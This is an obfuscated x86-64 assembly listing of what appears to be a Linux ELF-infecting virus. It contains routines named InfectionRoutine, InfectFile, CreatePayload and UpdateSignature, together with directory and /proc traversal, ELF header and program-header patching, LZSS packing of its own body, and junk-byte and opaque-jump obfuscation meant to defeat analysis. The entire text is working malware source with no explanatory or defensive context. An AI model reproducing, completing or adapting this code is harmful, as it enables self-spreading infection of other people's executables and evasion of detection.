    OFILE       QWORD [r2], r4
    cmp         eax, 0x3
    jl          ..@sUr0RrIHstJM
    jmp         $+5
db 0xc1, 0x6a, 0xe6
    jmp         $+3
db 0xb1
    jb          ..@lclrsoW7OYyj
    jae         ..@lclrsoW7OYyj
..@d7VcD6z4c3YZ:
    add         rsp, _VADDR_OFF_size
    jb          ..@nt2lJMjHgS0J
    jae         ..@nt2lJMjHgS0J
..@jCXSLsGeuq1T:
    mov         r2, QWORD [r1+file.filesize]
    jmp         ..@JeUwRCSIIeqc
..@JOimcqgVq9so:
    mov         rsi, QWORD [rsp+_LZSSE_OFF.inputaddr]
    jl          ..@N0Zyz5EXYjCS
    jge         ..@N0Zyz5EXYjCS
..@r2bkYMXNvZXR:
    mov         r2, m5
    call        CreatePayload
    jmp         $+4
db 0x4c, 0xf3
    jmp         $+5
db 0xd4, 0x1a, 0xa5
    jmp         $+5
db 0x1f, 0x4d, 0x10
    jb          ..@xMhvDzlrckgo
    jae         ..@xMhvDzlrckgo
..@MR9gxjaPVDGg:
    xor         rdx, rdx
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    jmp         $+3
db 0x46
    jmp         $+4
db 0x2d, 0xfe
    jb          ..@Q12ggicQtzYL
    jae         ..@Q12ggicQtzYL
..@oo7rhqogLghT:
    add         r1, signature_len
    mov         r3, QWORD [r5+file.filesize]
    call        MemMove
    jmp         $+5
db 0xdf, 0x55, 0xc6
    jmp         $+5
db 0xcd, 0xb1, 0xb3
    jmp         $+5
db 0x03, 0xdd, 0xda
    js          ..@XMTy8Rq9qc7m
    jns         ..@XMTy8Rq9qc7m
..@tozUcuzmm8QT:
    add         r1, 1
    add         r2, 1
    jmp         Strcpy
    jmp         $+5
db 0xd9, 0x1a, 0x46
    jl          ..@EJi78zNPQO7z
    jge         ..@EJi78zNPQO7z
..@d4VjqCiyV60p:
    cmp         BYTE [r1], 0x0
    jmp         $+5
db 0x04, 0x9c, 0x46
    jmp         ..@zBj9CeQngtVU
..@gCHU9Gf411QI:
    mov         eax, 0x00
    rep         stosb
    xor         rax, rax
    jmp         ..@HP0C6HRAFgvT
..@vmZ5oBNdssY5:
%ifdef X86_32
    mov         edx, esi
%endif
    jl          ..@UcntzVZ7xGsd
    jge         ..@UcntzVZ7xGsd
..@jHNbPyenPKzf:
    xor         rax, rax
    mov         ax, WORD [rsp+_DYNPIE_OFF.shentsize]
    jb          ..@A9d25z6mGTNg
    jae         ..@A9d25z6mGTNg
..@Parta2RfKnjH:
    cmp         BYTE [r1+16], ET_DYN
    jmp         $+5
db 0x16, 0x3d, 0xff
    jmp         ..@RNfQ7gmggYZK
..@3HdBw3ygj8D1:
    jmp         ..@djHLpTKCP5jT
    jb          ..@NykW4msVQ0bt
    jae         ..@NykW4msVQ0bt
..@66ylDtB6jmT0:
    mov         bx, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         ..@jG7AtIcxecSH
..@CwBYjYi6jSYJ:
    call        WORDToDWORDASCII
    jb          ..@DTZ02JPB8p1y
    jae         ..@DTZ02JPB8p1y
..@XJ5ibbxEyNyF:
    mov         QWORD [rsp+_PAYLOAD_OFF.entry], r1
    jl          ..@i78RRh9eNC1M
    jge         ..@i78RRh9eNC1M
..@2ZI4rapZ6Q2S:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    xor         rcx, rcx
    jl          ..@f2eXee63e2qe
    jge         ..@f2eXee63e2qe
..@NfzMIlXFBeh2:
    xor         rax, rax
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         $+5
db 0x05, 0x46, 0xd1
    jb          ..@gPtLHAgifm5y
    jae         ..@gPtLHAgifm5y
..@aT3E3I6b36H4:
    jge         ..@A6uKe7WTRKLp
    jmp         $+3
db 0x81
    jmp         $+3
db 0xf0
    js          ..@sJ16kHcaIgIm
    jns         ..@sJ16kHcaIgIm
..@Ov2zxCBYKZ8l:
%ifdef X86_32
    mov         edi, 0xffffffff
    push        ebp
    xor         ebp, ebp
%endif
    jmp         $+3
db 0xab
    jmp         $+3
db 0xfb
    jmp         $+3
db 0x55
    jl          ..@uwxKrVBQDhN6
    jge         ..@uwxKrVBQDhN6
..@WZCYAhM44Jz9:
    mov         rax, (-1)
    je          ..@4mmBGJJmsVK2
    jne         ..@4mmBGJJmsVK2
..@qBq32oM9to02:
    push        r1
    sub         rsp, _VADDR_OFF_size
    mov         QWORD [rsp+_VADDR_OFF.tmp_offset], 0
    jb          ..@5HjG9IGyT6zT
    jae         ..@5HjG9IGyT6zT
..@afKEHwm2P4XH:
    lea         r5, [rsp+_INFDIR_OFF.dirbuf+r4]
    mov         ax, WORD [r5+linux_dirent.d_reclen]
    add         r5, rax
    jmp         $+5
db 0x5c, 0xcf, 0xab
    jmp         ..@a6V9XKfWUJWz
..@UhGi1D2Kbk7C:
    mov         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH*2
    jmp         $+5
db 0x07, 0x32, 0x42
    jmp         ..@oP2M9Embt3Jv
..@y4T34efnqAEB:
    xor         rax, rax
    jmp         $+4
db 0x7b, 0xec
    jmp         $+5
db 0xbe, 0x45, 0x68
    jmp         $+4
db 0xc9, 0xc6
    jmp         $+4
db 0xdb, 0xe2
    js          ..@1UnvIoMbSrYs
    jns         ..@1UnvIoMbSrYs
..@clJhUJMamBel:
    lea         r2, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    call        Strcpy
    VAR         packed, status
    je          ..@U0RPo8LWRpqF
    jne         ..@U0RPo8LWRpqF
..@IPFTykcEmBz2:
    mov         eax, ebx
    and         eax, edx
    jmp         $+3
db 0x13
    js          ..@TNDMrBl9YybW
    jns         ..@TNDMrBl9YybW
..@vsbPHyp6RcDU:
    xor         rax, rax
    jmp         $+5
db 0x8f, 0x1f, 0x56
    js          ..@6M0Wf4H1tDJG
    jns         ..@6M0Wf4H1tDJG
..@f2eXee63e2qe:
    mov         ecx, signature_len
    jmp         $+3
db 0x86
    jmp         ..@CNwOIoZKLpPC
..@IXplQgubUvln:
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer] 
    mov         eax, 0x20
    rep         stosb
    jmp         $+4
db 0xb0, 0xeb
    jmp         $+3
db 0x6a
    jmp         $+5
db 0xf7, 0xd9, 0x01
    jl          ..@qPqkhcyC8QIp
    jge         ..@qPqkhcyC8QIp
..@WZFxm8wXMoff:
%ifdef X86_64
    mov         eax, SYS_MMAP
%endif
    je          ..@9JRnZsBZvoo3
    jne         ..@9JRnZsBZvoo3
..@6MI4yaj4p437:
    xor         rdx, rdx
    mov         dl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    jmp         ..@YEDpJL2PgITe
..@bhcJQzQUY5NB:
    sub         rsp, 0x100
    jmp         $+5
db 0x2b, 0xad, 0x98
    jmp         ..@lJKAalvFc6Ec
..@wk0gXiJhPpl7:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         ..@ZTbe8i04Q0kx
..@sQaeTbC3PUdF:
    cmp         BYTE [r1], 0x00
    je          ..@MEgy9b2de9UC
    push        r1
    jb          ..@BgauwM2LYHjW
    jae         ..@BgauwM2LYHjW
..@wyMW5kX4yqeA:
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr] 
    je          ..@OGFSlbAS5O53
    jne         ..@OGFSlbAS5O53
..@530RfEEgsyO3:
    xor         rbx, rbx
    jmp         ..@jHNbPyenPKzf
..@3o7rqEBWQHvI:
    mov         BYTE [r1], 0x00
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         $+3
db 0x52
    jmp         $+5
db 0x96, 0xb4, 0xd1
    jmp         ..@cUjxnx6qizm0
..@eXHZfecThxnD:
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    mov         BYTE [rdi], al
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         ..@d7ZOqOSecWLH
..@sRjlCvl7Cfh8:
    rep         stosb
    jmp         $+5
db 0xac, 0x0b, 0xf3
    je          ..@eIbzLHb1XxwN
    jne         ..@eIbzLHb1XxwN
..@COLmzSsXPUxN:
%ifdef X86_64
    mov         rcx, rdx
%endif
    jmp         ..@uqJzlD8IBHg1
..@Q12ggicQtzYL:
    and         WORD [rsp+_LZSSE_OFF.match_pos], WINDOW_LENGTH-1
    sub         al, 0x02
    mov         edx, 1
    jmp         ..@fWBWWmRqDYWB
..@oHIWO5kEZcF0:
    pop         r1
    js          ..@22HZkkzW0F0O
    jns         ..@22HZkkzW0F0O
..@ph6uTzMsN6Lq:
    xor         rax, rax
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    je          ..@LWIEUvrIaxC1
    jne         ..@LWIEUvrIaxC1
..@McnPsvxoKZqj:
    add         r1, non_packed_len+PADDING
    jmp         ..@zzr48W0aLlow
..@kGLiVG2nrF09:
    RFILE       rax, [rsp+_PROC_OFF.buffer], 0x100
    jmp         $+5
db 0xde, 0x3f, 0x35
    jmp         ..@GkfUFciLgzLF
..@8Sp41LNfuqjy:
    mov         r2, [rsp+_PROC_OFF.dirname]
    jmp         $+3
db 0x8e
    jl          ..@iJUKqf3nUkUW
    jge         ..@iJUKqf3nUkUW
..@UrMW0DvKSbJb:
    cmp         r1, 0x00
    jmp         $+4
db 0x52, 0x04
    jmp         $+5
db 0xfb, 0xc5, 0x65
    jmp         ..@ALDpThzJGsXW
LzssEncoder:
    jmp         ..@phKG7VwNz4oi
..@I4YlFnReoUKU:
    mov         bx, WORD [rsp+_LZSSE_OFF.match_pos]
    shl         ebx, LENGTH_BITS
    jmp         $+4
db 0x3b, 0xa9
    jmp         $+5
db 0xe1, 0xc8, 0xa9
    jmp         $+4
db 0xed, 0x33
    jmp         ..@Aus1rQLUvW0P
..@h1StUMNpoZ0L:
    and         rax, DF_1_PIE
    test        eax, eax
    jnz         ..@NykW4msVQ0bt
    jmp         $+4
db 0xe1, 0x0f
    jmp         $+3
db 0x9b
    jl          ..@CoL0HHHSmLRC
    jge         ..@CoL0HHHSmLRC
..@5D0DGauyUWv8:
    mov         QWORD [r2+p_h.p_offset], r3
    jmp         $+3
db 0x3b
    jmp         $+5
db 0x3a, 0xb0, 0x43
    js          ..@xMhCcsobBUFw
    jns         ..@xMhCcsobBUFw
..@sJ16kHcaIgIm:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x1
    xor         rax, rax
    jmp         $+3
db 0x97
    jmp         ..@AXJpSiX1BaFC
..@sECNm1iHLKOi:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], r5
    jmp         $+5
db 0xa1, 0x13, 0x49
    js          ..@LqU2K8ZALkX7
    jns         ..@LqU2K8ZALkX7
..@YEAksV5fcbo6:
    call        MapFile
    cmp         rax, 0
    jne         ..@dzK0HcBQiYib
    jl          ..@DSdRqA8znBnF
    jge         ..@DSdRqA8znBnF
..@1iXkpC7N9wr7:
    call_vsp    ExitProgram
    jmp         $+4
db 0x9c, 0x63
    je          ..@F76KGCx60c52
    jne         ..@F76KGCx60c52
..@MQX9vkR8JWLk:
    mov         r2, 1b
    call        MapFile
    cmp         rax, 0
    je          ..@plNQS9w4mlWa
    jne         ..@plNQS9w4mlWa
..@3XqVEgBRz6R3:
    mov         r4, 0x1
    xor         rax, rax
    jb          ..@Tc7G10263bVq
    jae         ..@Tc7G10263bVq
..@FHlyXvChHXUH:
    je          ..@ljGEncg3Zzqr
    cmp         rdi, rsi
    jbe         ..@HyLnKb7NX8zU
    jmp         ..@yKoNojihZ1gK
..@9tWINjEBNfak:
    cmp         rax, 0x00
    jle         ..@qbVFHOrRPJJB
    jmp         ..@KyC9NpFMIIpI
..@G0YwH0Y78FlN:
    sub         ebx, 1
    cmp         bx, WORD [rsp+_LZSSE_OFF.w_index]
    jge         ..@ejGVuZm0dijq
    jmp         $+4
db 0x86, 0x9f
    je          ..@5Ahu5f3LdaFu
    jne         ..@5Ahu5f3LdaFu
..@i78RRh9eNC1M:
    mov         WORD [rsp+_PAYLOAD_OFF.index], r2w
    jmp         ..@q9qIxJxUd2AC
..@tPaFdmWgSL77:
    jmp         ..@WEitd0rgpwXf
    jmp         $+4
db 0xf2, 0x26
    je          ..@J7bTRvkcGqyh
    jne         ..@J7bTRvkcGqyh
..@zS7Rq4krfsJN:
    sub         WORD [rsp+_LZSSE_OFF.w_index], WINDOW_LENGTH
    jmp         $+5
db 0x71, 0xf8, 0x5f
    jmp         ..@TU6OJvUX9dqE
..@2pIalt5S7lvR:
    test        al, al
    jmp         $+5
db 0x70, 0x3b, 0x41
    jmp         ..@ROmVVoPa3LZK
..@XEAqlIbdDYx2:
%ifdef X86_32
    pop         ebp
%endif
    jmp         $+3
db 0xf6
    jmp         ..@29QFonJzP6l5
..@hT1GVIfGWhnH:
    jmp         ..@43hnsLqgWWf9
    js          ..@ygeGKtxnlrf5
    jns         ..@ygeGKtxnlrf5
..@dFgcJevyuMtM:
    jmp         ..@A0SsorrEBmWq
    jmp         $+5
db 0x19, 0x14, 0xd2
    jmp         ..@fCjkWJEANPMM
..@A6uKe7WTRKLp:
    xor         rax, rax
    jmp         $+5
db 0x5c, 0x85, 0xcc
    jmp         ..@SlftDDmMHfgw
..@iegNOCDOEUxx:
    push        r4
    push        r5
    xor         r4, r4
    jmp         $+3
db 0x79
    jmp         $+4
db 0x6c, 0xdd
    jmp         ..@DvTDASZVDBNW
..@BW4zSPL7xgZB:
    mov         rax, QWORD [rsi+rcx+bytes]
    jmp         $+4
db 0x3b, 0x1a
    jb          ..@h1StUMNpoZ0L
    jae         ..@h1StUMNpoZ0L
..@5IPq53m9RQQq:
    xor         r1, r1
    xor         r2, r2
    xor         r3, r3
    jmp         $+4
db 0x33, 0x85
    js          ..@nxRTYKWHuF7m
    jns         ..@nxRTYKWHuF7m
..@uOxu5wu8Ukbi:
    cmp         rax, 0xffffffffffffffff
    je          ..@WZCYAhM44Jz9
    jmp         $+4
db 0x7a, 0x9d
    jmp         $+3
db 0x76
    jb          ..@On7NrZRK9WY8
    jae         ..@On7NrZRK9WY8
..@U3FUO9R80p6b:
    VAR         packed, dirs_tmp
    jmp         $+3
db 0x23
    jb          ..@ZoHcsh2KkIm8
    jae         ..@ZoHcsh2KkIm8
..@ylOazURaUjal:
    ret
    jmp         $+4
db 0x6b, 0xc5
    jmp         FileValidation
..@TvMJCMdpgnEa:
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    jmp         $+4
db 0xe3, 0x5d
    jmp         $+3
db 0x19
    jmp         ..@wxfr1m3K8hQn
..@XLSCJfcmHaU4:
    mov         DWORD [rdi], esi
    add         rdi, 0x4
    js          ..@L8SI4Q0hvnB2
    jns         ..@L8SI4Q0hvnB2
..@Pb9HRUSueX5E:
    mov         ax, WORD [r1]
    mov         WORD [rsp+_DYNPIE_OFF.shentsize], ax
    je          ..@89EGBFuhqpaz
    jne         ..@89EGBFuhqpaz
..@2XeldRTDdmIZ:
    jge         ..@TM6cOr1OMe9x
    cmp         r1, 0x00
    jg          ..@jA95S8yFo8Np
    jmp         $+4
db 0x8e, 0x94
    jb          ..@e5oF455s1hIc
    jae         ..@e5oF455s1hIc
..@On7NrZRK9WY8:
    mov         QWORD [r5+file.fileptr], rax
    mov         QWORD [r5+file.filesize], r3
    jmp         ..@4mmBGJJmsVK2
    jmp         $+5
db 0x22, 0x76, 0x02
    js          ..@WZCYAhM44Jz9
    jns         ..@WZCYAhM44Jz9
..@86HzY8FxXNGv:
    mov         DWORD [rsp+_PROC_OFF.filefd], eax
    js          ..@kGLiVG2nrF09
    jns         ..@kGLiVG2nrF09
..@RNfQ7gmggYZK:
    je          ..@d7GvsyAHLogR
    js          ..@PP3uQQmp0bib
    jns         ..@PP3uQQmp0bib
..@d8ObTKoBSuar:
%ifdef X86_32
    mov         edx, 11b
%endif
    jmp         $+5
db 0x2d, 0x8c, 0x74
    jmp         $+4
db 0x26, 0xdf
    jmp         ..@bhVwtUIke60Z
..@auWP23r0EeLM:
    jmp         ..@qbVFHOrRPJJB
    jmp         $+5
db 0xbe, 0x50, 0xd0
    jl          ..@n9WAUeeZGNXi
    jge         ..@n9WAUeeZGNXi
..@wgRZQWV41wu9:
    xor         rax, rax
    jmp         $+4
db 0x57, 0xa4
    jb          ..@FucAtSKbpkVo
    jae         ..@FucAtSKbpkVo
..@YG4t0ZzlmJqI:
    mov         rax, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    add         rax, QWORD [rsp+_VADDR_OFF.tmp_offset]
    mov         r3, rax
    jmp         ..@tY3TwmNV0PM0
..@Q0bw8o3R91uH:
    xor         rax, rax
    jmp         $+5
db 0x30, 0xae, 0x09
    jmp         ..@d4VjqCiyV60p
..@zIienJQVfkDz:
    mov         r3, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    jmp         $+3
db 0xb3
    je          ..@5D0DGauyUWv8
    jne         ..@5D0DGauyUWv8
..@r89U95L6j7fN:
    jmp         ..@N1E40XH55Ri0
    jmp         $+5
db 0x2a, 0x9c, 0xf7
    jl          ..@azqWxJG15B8f
    jge         ..@azqWxJG15B8f
..@ShJzHEZS1cV9:
    pop         r1
    je          ..@q8bgaPV36m0N
    jne         ..@q8bgaPV36m0N
..@zBj9CeQngtVU:
    jz          ..@FiWyyLyeUpyJ
    jb          ..@6DSZISOsgeyW
    jae         ..@6DSZISOsgeyW
MemMove:
    jmp         ..@XydQyQvy7xw8
..@TNDMrBl9YybW:
    test        eax, eax
    jnz         ..@ph6uTzMsN6Lq
    jmp         $+3
db 0xde
    jmp         $+5
db 0x0f, 0x4a, 0x9d
    jl          ..@gDiTMfTK494w
    jge         ..@gDiTMfTK494w
..@JDI87hjBxRR6:
    xor         rax, rax
    jmp         ..@jh2Bn1eeLHOS
..@KyC9NpFMIIpI:
    mov         r5, r3
    mov         r3, rax
    jmp         $+4
db 0x0c, 0xe3
    jmp         ..@GOGYdNSmFy4c
..@d6AE0V20Wp8k:
    inc         WORD m5
    je          ..@dFgcJevyuMtM
    jne         ..@dFgcJevyuMtM
..@3mVcPwsr3rmM:
    xor         rcx, rcx
    jmp         $+3
db 0x58
    jb          ..@m7n3qeerO7To
    jae         ..@m7n3qeerO7To
..@vw4UGYZLLGEH:
    xor         r2, r2
    mov         r2b, BYTE [rsp+_INFDIR_OFF.depth]
    je          ..@5gpRf02VCKKG
    jne         ..@5gpRf02VCKKG
..@hqrVdOrH505b:
    xor         rax, rax
    jmp         $+4
db 0x7f, 0x48
    jmp         $+5
db 0xb2, 0x60, 0x68
    js          ..@IEz5rXmXLd2w
    jns         ..@IEz5rXmXLd2w
..@uAZwZ6TqHkyP:
    add         r4, r3
    xor         r2, r2
    mov         r2w, WORD [r1+e_h.e_phnum]
    jmp         $+3
db 0x31
    jb          ..@RgaO5zTohTzS
    jae         ..@RgaO5zTohTzS
..@73aRoLv90i11:
    mov         r1, QWORD [r5+file.fileptr]
    mov         r3, r2
    mov         r2, QWORD [r5+file.filesize]
    jl          ..@3XqVEgBRz6R3
    jge         ..@3XqVEgBRz6R3
..@HD2Y46h4tyee:
    jmp         ..@VeHdr6sDa8P3
    jmp         $+5
db 0xc2, 0xa5, 0xf1
    jmp         ..@ph6uTzMsN6Lq
..@ahQ1WwtXu1pV:
    pop         r2
    pop         r5
    ret
    jmp         $+5
db 0x0b, 0x3a, 0x5b
    jmp         MemMove
..@zGP0FqIWDGhH:
    mov         r2, original_virus_len+PADDING
    jl          ..@V8SknNDb4R2V
    jge         ..@V8SknNDb4R2V
InfectionRoutine:
    jmp         ..@hrD02y14laZ6
..@SlftDDmMHfgw:
    xor         rcx, rcx
    jmp         $+3
db 0xf3
    jmp         $+3
db 0x46
    jl          ..@kCN9Ugyrtzbx
    jge         ..@kCN9Ugyrtzbx
..@ljGEncg3Zzqr:
    pop         r5
    pop         r4
    ret
    jmp         $+3
db 0xc1
    js          MapFile
    jns         MapFile
..@fCjkWJEANPMM:
    cmp         r4w, WORD [r1+e_h.e_phnum]
    jge         ..@qbVFHOrRPJJB
    js          ..@SKxKgqeJ2N2X
    jns         ..@SKxKgqeJ2N2X
..@C2yXooXz9rNl:
    mov         QWORD [rsp+_PROC_OFF.dirname], r5
    mov         r1, r5
    jb          ..@CJiDUK4I2AlZ
    jae         ..@CJiDUK4I2AlZ
..@tm0VWgJs0D1Y:
    cmp         QWORD m6, 0x00
    jmp         $+5
db 0x58, 0x0d, 0xd2
    jmp         $+4
db 0xfd, 0x1f
    jl          ..@PzxaX5KSkPFx
    jge         ..@PzxaX5KSkPFx
..@gZV35taYeXBj:
    lea         r1, [rsp+_PROC_OFF.buffer]
    js          ..@8Sp41LNfuqjy
    jns         ..@8Sp41LNfuqjy
..@xBpNA9oCNN9W:
    jne         ..@dzK0HcBQiYib
    jb          ..@5cjzUn7MhpEC
    jae         ..@5cjzUn7MhpEC
..@pk6TZ2H9NV10:
    VAR         packed, procdir
    jmp         ..@C2yXooXz9rNl
..@xnwbDvuCssKC:
    push        r5
    push        r4
    push        r3
    jb          ..@UC5Bad51823e
    jae         ..@UC5Bad51823e
..@3O6gkc9MlacU:
    xor         rdx, rdx
    jmp         $+3
db 0x57
    jb          ..@9zOFhVxiu4Oc
    jae         ..@9zOFhVxiu4Oc
..@sGaDua7sRJxG:
    cmp         BYTE [r1], DT_DIR
    jmp         $+5
db 0x07, 0x77, 0x6b
    jmp         $+4
db 0x3a, 0xc9
    jmp         ..@aZ8ON73BPYOY
..@tY3TwmNV0PM0:
    and         r3, 0xfff 
    jmp         $+4
db 0xf5, 0x9f
    jmp         $+4
db 0x14, 0xb2
    jb          ..@yJjjdY1hCKgj
    jae         ..@yJjjdY1hCKgj
..@zXbOdMTUSa1t:
%ifdef X86_64
    mov         r10, 0x22
    mov         r8, 0xffffffffffffffff
    mov         eax, SYS_MMAP
%endif
    jb          ..@mBrAViI583r4
    jae         ..@mBrAViI583r4
..@lJKAalvFc6Ec:
    push        0x00
    mov         rax, SYS_GETUID
    syscall
    jmp         $+3
db 0x57
    js          ..@5FgopFvOxVhL
    jns         ..@5FgopFvOxVhL
..@dZUcHw5hysaH:
    add         r1, 1
    jmp         $+3
db 0x1a
    jb          ..@nH39pqx7ZKT6
    jae         ..@nH39pqx7ZKT6
..@GLFq4K2b5hyz:
    mov         WORD [rsp+_LZSSE_OFF.w_index], 0x0000
    je          ..@EAEjtPEhpE1w
    jne         ..@EAEjtPEhpE1w
..@p6A0HXWEmkUA:
    add         rax, r2
    jmp         $+3
db 0x02
    jmp         $+4
db 0x22, 0x3a
    jmp         ..@1QGs0i7mMllT
..@ZUbpyE12IbBq:
    test        r2, r2
    jmp         ..@SlGIYXiGKMzm
..@LEGIhAAsWT5o:
    mov         BYTE [r1], 0x00
    jb          ..@CST76KrA8vyS
    jae         ..@CST76KrA8vyS
..@W57tXk6jOgbI:
    add         r5, 1
    jl          ..@1deZsL5Q29tR
    jge         ..@1deZsL5Q29tR
..@SwAaP3n8xYzX:
    mov         edx, LOOKAHEAD_LENGTH
    cmp         ax, LOOKAHEAD_LENGTH
    js          ..@KmKEnozBWPNR
    jns         ..@KmKEnozBWPNR
..@3gjiBnuKu8a3:
    mov         r1, QWORD [rsp+_DYNPIE_OFF.ptr]
    mov         r2, r1
    add         r2, e_h.e_shoff
    jl          ..@OTiEIID5QIbz
    jge         ..@OTiEIID5QIbz
..@B3MS1q73W8D7:
    jl          ..@f3mrQqeDOS5h
    pop         rax
    jmp         $+5
db 0x5e, 0xf0, 0xb0
    jmp         $+3
db 0xec
    jb          ..@JNzVAcAD8nj1
    jae         ..@JNzVAcAD8nj1
AddSizeMappedFile:
    jmp         ..@iegNOCDOEUxx
..@9JRnZsBZvoo3:
%ifdef X86_64
    syscall
%endif
    jmp         $+4
db 0xf8, 0xec
    jmp         ..@BhKj0QjWzwUk
UpdateSignature:
    jmp         ..@ofdqhn1NQ0Gk
..@0Pl0xvIovRKN:
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2, r1
    jmp         $+3
db 0x58
    jl          ..@oo7rhqogLghT
    jge         ..@oo7rhqogLghT
..@5gpRf02VCKKG:
    add         r2, 1
    jmp         $+4
db 0x34, 0x8c
    jmp         ..@CN8MS7JN1NqH
..@3bARibDlxqp5:
    add         rsi, WINDOW_LENGTH
    rep         movsb
    sub         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH
    je          ..@EGBL5mok1doB
    jne         ..@EGBL5mok1doB
..@PzxaX5KSkPFx:
    je          ..@qbVFHOrRPJJB
    jmp         $+5
db 0xfb, 0x06, 0x95
    jmp         ..@1U4zO5AFr8kL
..@ODUvAIniD2lG:
    push        r1
    mov         r5, r2
    jmp         $+4
db 0xa1, 0x9c
    jmp         $+5
db 0xe8, 0x3b, 0xed
    jmp         $+3
db 0x95
    je          ..@CI5IPBii6I5g
    jne         ..@CI5IPBii6I5g
..@9u9eh7vHvpGG:
    cmp         BYTE [r2], 0x0
    jz          ..@EJi78zNPQO7z
    movzx       rax, BYTE [r2]
    jmp         ..@JT3iZI4UH3X1
..@U710cSJ50QEU:
    jl          ..@nVKVrWaGZRpY
    jb          ..@KNTQDK931Zgd
    jae         ..@KNTQDK931Zgd
..@fGAz4qQWGTeE:
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2, QWORD [r1+e_h.e_entry]
    test        r2, r2
    jmp         ..@kmelUkb90j65
..@WEitd0rgpwXf:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    movzx       rax, BYTE [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_reclen+r4]
    jmp         $+3
db 0x38
    jmp         $+5
db 0xb9, 0xe4, 0xf9
    je          ..@SX9BUu918rsl
    jne         ..@SX9BUu918rsl
..@IexbbH58HbLf:
    jmp         ..@MEgy9b2de9UC
    jmp         ..@XvTicxJ9t44I
..@mBrAViI583r4:
%ifdef X86_64
    syscall
%endif
    jl          ..@je5ZqGAqnlCO
    jge         ..@je5ZqGAqnlCO
..@AedPqswzp2hU:
    xor         r1, r1
    call_vsp    ExitProgram
    jmp         ..@EMN8AcMIGzf6
..@F0tC96kkB440:
    je          ..@D8W8e4haqHW2
    mov         rax, 2
    ret
    jmp         ..@D8W8e4haqHW2
..@95TrBDSbQ4II:
    ret
    jmp         GetNewProgramVaddr
..@n9WAUeeZGNXi:
    lea         r1, [rsp+_INFFILE_OFF.file]
    call        UnmapFile
    mov         r2, 11b
    jmp         $+4
db 0xbb, 0x00
    jmp         $+3
db 0x3b
    jmp         $+4
db 0x36, 0xca
    jmp         $+3
db 0x71
    jmp         ..@YEAksV5fcbo6
..@dVpU7A7whf42:
    add         rdi, virus_len-_start
    mov         rsi, m7
    sub         rsi, m6
    jmp         $+5
db 0xa7, 0xee, 0xba
    jmp         $+3
db 0x17
    jb          ..@XLSCJfcmHaU4
    jae         ..@XLSCJfcmHaU4
..@4ImuwKZoSqjy:
    je          ..@WEitd0rgpwXf
    cmp         WORD [r1], './'
    jmp         ..@3UHbWkaLTJ9p
..@ygeGKtxnlrf5:
    add         eax, 0x30
    je          ..@nDAHvvWraB6u
    jne         ..@nDAHvvWraB6u
..@XBZzWf5okgHA:
    jne         ..@WEitd0rgpwXf
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jb          ..@bzmppiWkxZgV
    jae         ..@bzmppiWkxZgV
..@EjhoNlygcQiu:
    jmp         ..@Te6otUElfohC
    jmp         ..@YG4t0ZzlmJqI
..@nH39pqx7ZKT6:
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         $+3
db 0x86
    jl          ..@7phtxoUYOyAd
    jge         ..@7phtxoUYOyAd
..@CoL0HHHSmLRC:
    add         rcx, 2*bytes
    jmp         ..@SBgzUianowNO
    jmp         $+5
db 0x16, 0x0a, 0x7e
    jmp         ..@dMAPu8k6x47E
..@Ngpr1MYqSiqi:
    mov         rax, SYS_FTRUNCATE
    jl          ..@FKu04PA3nPvo
    jge         ..@FKu04PA3nPvo
..@Tmxe7TfzkDAc:
    lea         r1, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    call        IsNum
    test        eax, eax
    js          ..@nGUCZPSAwbYJ
    jns         ..@nGUCZPSAwbYJ
..@KlNOXnMdo87d:
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    call        Strcpy
    mov         BYTE [r1], '/'
    je          ..@dZUcHw5hysaH
    jne         ..@dZUcHw5hysaH
InfectFile:
    jmp         ..@ddpSo9ehycNJ
..@t0AXUPUk3vkx:
    mov         r2, signature_len
    jmp         ..@zVu0AsfzTo0s
..@BCTqUCUFTDvy:
%ifdef X86_64
    mov         rsi, QWORD [r8+file.filesize]
    mov         edx, r10d
%endif
    jmp         ..@mEu8LLgoeHTN
..@oIUDBxORBNW3:
    add         r1, rax
    sub         r1, 1
    js          ..@sGaDua7sRJxG
    jns         ..@sGaDua7sRJxG
..@kVvP5h0iOG3E:
    pop         r2
    pop         r3
    jb          ..@hMQ6P7aEgXSE
    jae         ..@hMQ6P7aEgXSE
..@azqWxJG15B8f:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    xor         r1, r1
    je          ..@1iXkpC7N9wr7
    jne         ..@1iXkpC7N9wr7
..@N1E40XH55Ri0:
    mov         r1, r5
    add         r1, r4
    jmp         $+4
db 0x53, 0xe1
    jl          ..@SJp758yQ9DS9
    jge         ..@SJp758yQ9DS9
..@6BQtE1pc1e3n:
    xor         r2, r2
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         ..@2EZz8kUDws68
..@60FnGAlmelo5:
    mov         rdi, m6
    mov         rcx, m7
    sub         rcx, m6
